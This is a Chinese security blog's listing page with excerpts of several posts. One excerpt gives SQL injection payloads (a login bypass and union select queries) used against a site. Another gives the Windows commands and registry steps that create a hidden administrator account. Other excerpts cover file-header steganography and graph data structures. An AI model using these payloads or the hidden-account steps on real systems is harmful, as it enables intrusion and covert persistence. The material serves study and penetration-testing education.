</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/01/30/MSSQLPenetrationTest_0x01/" title="MSSQL渗透测试过程(上)">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSSQL渗透测试过程(上)"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/01/30/MSSQLPenetrationTest_0x01/" title="MSSQL渗透测试过程(上)">MSSQL渗透测试过程(上)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-01-30T03:39:08.000Z" title="发表于 2019-01-30 11:39:08">2019-01-30</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">开始准备工作
用什么nmap,awvs,vooli,ibm一堆工具搞了一遍发现没啥有用的信息
然后直接打开网站只有一个后台，这样只能看下能不能后台注入

 
如上图显示是有注入点的试下'or '1'='1'--直接进去了
 
结果发现后台啥功能都没有就几张图
然后转去搞APP去了，发现APP都是些泄露账户密码什么的没啥好玩的
振奋人心的发现
在Fiddler中抓到了一些奇怪的JS文件打开一看好多网址，都是我用IBM没扫描出来的东西，在一堆网址中找到了一个网页可以使用
 
用老方法测试发现存在注入点如图
 
我们用order by 猜字段得出有12个字段
 
接着构造语句查询数据库版本数据库权限等信息
'union select null,null,null,null,@@version,null,null,null,null,null,null,null --   查询数据库版本
'union select null,null,null,null,system_user,null,null,null,null,null,null,null --   用户权限
查询的后的一些基础信息
s ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/01/14/MakeAHiddenAdministratorAccount/" title="制作隐藏的管理员账户">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/44.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="制作隐藏的管理员账户"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/01/14/MakeAHiddenAdministratorAccount/" title="制作隐藏的管理员账户">制作隐藏的管理员账户</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-01-14T14:26:46.000Z" title="发表于 2019-01-14 22:26:46">2019-01-14</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">如何创建隐藏的administrator账户
创建管理员用户zhou
net user zhou 123456h /add

net localgroup administrators Waldo /add
添加超级隐藏管理员账户
net user Ascotb$ 123456 /add

net localgroup administrators Ascotb$ /add
制作注册列表
但在管理账户面板依然能够看见，下面要解决这个问题

在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下找  到新建的帐户Ascotb$

获取默认类型为0x3ef，将注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Ascotb$导出为1.reg
在注册表下能够找到对应类型名称的注册表项    HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EF右键将该键导出为2.reg默认情况下，管理员帐户Administ ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/01/13/SteganographicFileIdentification/" title="隐写文件标识">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/45.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="隐写文件标识"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/01/13/SteganographicFileIdentification/" title="隐写文件标识">隐写文件标识</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-01-13T13:22:16.000Z" title="发表于 2019-01-13 21:22:16">2019-01-13</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">一.文件常见头16进制标识

二.图片IHDR
文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。 
文件头数据块由13字节组成，它的格式如下表所示。 

一般位置如下图

</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2018/12/10/DataStructureDiagram/" title="数据结构图">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构图"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/10/DataStructureDiagram/" title="数据结构图">数据结构图</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-10T11:18:39.000Z" title="发表于 2018-12-10 19:18:39">2018-12-10</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">浅析数据结构-图的基本概念
线性表和树两类数据结构，线性表中的元素是“一对一”的关系，树中的元素是“一对多”的关系，本章所述的图结构中的元素则是“多对多”的关系。图（Graph）是一种复杂的非线性结构，在图结构中，每个元素都可以有零个或多个前驱，也可以有零个或多个后继，也就是说，元素之间的关系是任意的。

一、图的定义与术语
定义：图（Graph）是由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为：G(V,E)，其中，G表示一个图，V是图G中顶点的集合，E是图G中边的集合。
1、图的分类
图是按照无方向和有方向分为无向图和有向图。

左图为无向图是由顶点和边构成，右图为有向图是由顶点和弧（有向边构成）。弧有弧头和弧尾区别。
按照边分为稀疏图和稠密图，这是个模糊的概念，同样是相对的概念。
如果任意两个顶点之间都存在边叫完全图，有向的边叫有向完全图。如果无重复的边或者顶点到自身的边叫简单图。在用数学方式表示时，无向边用()表示，有向边用&lt;&gt;表示。现在我们讲解的图全是简单图。

左图没有重复的边或者到自身的边（简单图），右图则有。

这种边带权值的图叫网
2.图的顶点和边间 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，如有违规和作者无关！</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/126.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"/></a><div class="content"><a class="title" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</a><time datetime="2021-05-18T15:45:42.000Z" title="发表于 2021-05-18 23:45:42">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/123.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux堆溢出总结（0x01）"/></a><div class="content"><a class="title" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">Linux堆溢出总结（0x01）</a><time datetime="2021-05-04T15:45:42.000Z" title="发表于 2021-05-04 23:45:42">2021-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/122.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux栈溢出总结（0x03）"/></a><div class="content"><a class="title" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">Linux栈溢出总结（0x03）</a><time datetime="2021-03-26T10:45:42.000Z" title="发表于 2021-03-26 18:45:42">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Office Excel Macro"/></a><div class="content"><a class="title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><time datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台"><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/120.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从零开始编写XSS平台"/></a><div class="content"><a class="title" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">从零开始编写XSS平台</a><time datetime="2021-01-08T10:45:42.000Z" title="发表于 2021-01-08 18:45:42">2021-01-08</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/05/"><span class="card-archive-list-date">2021年05月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">2021年03月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/01/"><span class="card-archive-list-date">2021年01月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/12/"><span class="card-archive-list-date">2020年12月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">2020年11月</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">2020年08月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/07/"><span class="card-archive-list-date">2020年07月</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/05/"><span class="card-archive-list-date">2020年05月</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">101</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2017-08-08T16:00:00.000Z"></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-05-24T06:21:18.241Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2021 By ascotbe</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    var typed = new Typed("#subtitle", {
      strings: "今日不学习&#44;明日变废物,I always forget to tell you that how lucky&#44;I am to encounter you.".split(","),
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '今日不学习&#44;明日变废物'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Bronya.model.json"},"display":{"position":"right","width":400,"height":500,"hOffset":-90,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>